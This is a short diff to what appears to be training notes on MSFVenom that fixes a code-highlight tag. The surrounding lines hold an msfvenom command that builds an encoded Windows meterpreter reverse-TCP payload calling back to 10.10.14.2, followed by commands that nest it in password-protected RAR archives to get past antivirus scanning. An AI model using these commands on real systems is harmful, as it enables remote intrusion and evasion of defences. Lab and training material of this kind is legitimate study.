@@ -268,7 +268,8 @@ MSFVenom is the successor of MSFPayload and MSFEncode, two stand-alone scrip
 
 `XeroCyb3r@htb[/htb]$ msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -e x86/shikata_ga_nai -a x86 --platform windows -o ~/test.js -i 5`
 
-{% highlight XeroCyb3r@htb[/htb]$ rar a ~/test.rar -p ~/test.js %}
+{% highlight bash %}
+XeroCyb3r@htb[/htb]$ rar a ~/test.rar -p ~/test.js
 XeroCyb3r@htb[/htb]$ mv test.rar test
 XeroCyb3r@htb[/htb]$ rar a test2.rar -p test
 XeroCyb3r@htb[/htb]$ mv test2.rar test2
